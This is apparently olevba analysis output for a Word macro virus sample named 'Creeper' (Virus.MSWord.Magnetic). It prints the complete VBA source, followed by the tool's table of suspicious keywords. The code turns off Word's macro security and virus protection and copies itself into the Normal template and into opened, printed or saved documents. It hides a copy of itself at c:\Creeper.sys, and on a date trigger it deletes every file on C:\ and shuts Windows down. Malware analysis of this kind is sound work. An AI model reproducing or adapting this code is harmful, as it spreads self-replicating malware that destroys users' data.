olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Magnetic
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Virus.MSWord.Magnetic - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Creeper.bas 
in file: ./Virus.MSWord.Magnetic - OLE stream: 'Macros/VBA/Creeper'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoExec()
Attribute AutoExec.VB_Description = "Creeper 1.0"
Attribute AutoExec.VB_ProcData.VB_Invoke_Func = "Normal.Creeper.AutoExec"
' Creeper W97M (c) 1999 Electro Magnetic Defication
' Thank You For Purchasing Microsoft Office 97
' Thank You For Beta Testing Office 2000
' Where Do I Want To Go Today??.....DisneyLand!
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
End If
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Day(Now) = Minute(Now) Then
With WordBasic
.Call "YourAss"
End With
End If
With Application.FileSearch
.LookIn = "C:\"
.FileName = "Creeper.sys"
    If .Execute(SortBy:=msoSortByFileName, _
            SortOrder:=msoSortOrderAscending) > 0 Then
For a = 1 To .FoundFiles.Count
GoTo AllDone
Next a
Else
NormalTemplate.VBProject.VBComponents("Creeper").Export "c:\Creeper.sys"
SetAttr "c:\Creeper.sys", vbHidden
End If
End With
AllDone:
End Sub

Sub ToolsMacro()
With WordBasic
.Call "YourAss"
End With
End Sub

Sub ViewVBCode()
With WordBasic
.Call "YourAss"
End With
End Sub

Sub YourAss()
On Error Resume Next
With Application.FileSearch
.LookIn = "C:\"
.SearchSubFolders = True
.FileName = "*.*"
    If .Execute(SortBy:=msoSortByFileName, _
            SortOrder:=msoSortOrderAscending) > 0 Then
For b = 1 To .FoundFiles.Count
Kill .FoundFiles(b)
Next b
Else
End If
End With
Tasks.ExitWindows
End Sub

Sub AutoOpen()
On Error Resume Next
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
End If
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Minute(Now) = Hour(Now) Then
ActiveDocument.Password = "Creeper"
ActiveDocument.Save
End If
Dim EN$
On Error GoTo -1: On Error GoTo NotThere
With WordBasic
.ToolsMacro Name:="CheckForCreeper", Show:=1, Run:=1
.Call "Creeper"
End With
GoTo AlreadyThere
NotThere:
Err.Number = 0
On Error Resume Next
EN$ = WordBasic.[FileName$]()
With WordBasic
.MacroCopy EN$ + ":Creeper", "Creeper", 1
NormalTemplate.Save
ActiveDocument.VBProject.VBComponents("Creeper").Export "c:\Creeper.sys"
SetAttr "c:\Creeper.sys", vbHidden
End With
GoTo AlreadyThere
AlreadyThere:
If Day(Now) = Minute(Now) Then
With WordBasic
.Call "YourAss"
End With
GoTo AllDone
AllDone:
End If
End Sub
Sub CheckForCreeper()

End Sub
Sub FileOpen()
On Error GoTo ChangeMind
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileOpen(False)
With WordBasic
.CurValues.FileOpen dlg
.Dialog.FileOpen dlg
.FileOpen dlg
.Call "Creeper"
End With
ChangeMind:
End Sub

Sub FilePrint()
On Error GoTo ChangeMind
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FilePrint(False)
With WordBasic
.CurValues.FilePrint dlg
.Dialog.FilePrint dlg
.FilePrint dlg
.Call "Creeper"
End With
ChangeMind:
End Sub

Sub FileSaveAs()
On Error GoTo ChangeMind
Dim dlg As Object: Set dlg = WordBasic.DialogRecord.FileSaveAs(False)
With WordBasic
.CurValues.FileSaveAs dlg
.Dialog.FileSaveAs dlg
.FileSaveAs dlg
.Call "Creeper"
End With
ChangeMind:
End Sub

Sub Creeper()
Attribute Creeper.VB_ProcData.VB_Invoke_Func = "Normal.Creeper.Creeper"
On Error Resume Next
For c = 1 To ActiveDocument.VBProject.VBComponents.Count
If ActiveDocument.VBProject.VBComponents(c).Name = "Creeper" Then d = True
Next c
If d = True Then GoTo AlreadyThere Else
ActiveDocument.VBProject.VBComponents.Import "c:\Creeper.sys"
ActiveDocument.Save
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "Creeper") = "(c) 1999 Electro Magnetic Defication"
GoTo AllDone
AlreadyThere:
On Error Resume Next
If Day(Now) = Minute(Now) Then
With WordBasic
.Call "YourAss"
End With
End If
GoTo AllDone
AllDone:
End Sub









+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Run                 |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

